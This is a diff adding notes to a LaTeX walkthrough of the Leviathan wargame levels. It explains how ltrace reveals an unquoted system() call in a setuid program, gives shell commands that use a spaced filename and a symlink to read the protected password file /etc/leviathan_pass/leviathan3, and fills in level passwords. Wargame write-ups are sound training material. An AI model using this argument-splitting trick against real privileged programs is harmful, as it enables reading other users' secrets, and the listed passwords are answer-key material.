@@ -90,12 +90,28 @@ ltrace ./check
 
 \subsection*{leviathan2}
 \pass{ougahZi8Ta}
-\chall
+\chall \textbf{ltrace} is a fantastic tool for discovering the exploit here, it's use reveals two important function calls.
 \begin{lstlisting}
+access("filename", 4)
 \end{lstlisting}
+\begin{lstlisting}[deletekeywords={file}]
+system("/bin/cat filename"file content
+\end{lstlisting}
+\note{'file content' is output by \textbf{ltrace} as part of the executable examination}
+
+These two functions check for read permissions of the file and pass the filename to the command line receptively. The flaw in the script lies in the quotations, the double quotes around the filename are dropped for the shell call.
+
+This causes issues with a spaced filename, as \textbf{cat} will print out each argument given. This can be taken advantage of with the following:
+\begin{lstlisting}
+echo "file a" > a
+echo "file a b" > 'a b'
+ln -s /etc/leviathan_pass/leviathan3 b
+~/printfile "a b"
+\end{lstlisting}
+\note{Files may need to be given read access to the others group}
 
 \subsection*{leviathan3}
-\pass{}
+\pass{Ahdiemoo1j}
 \chall
 \begin{lstlisting}
 \end{lstlisting}
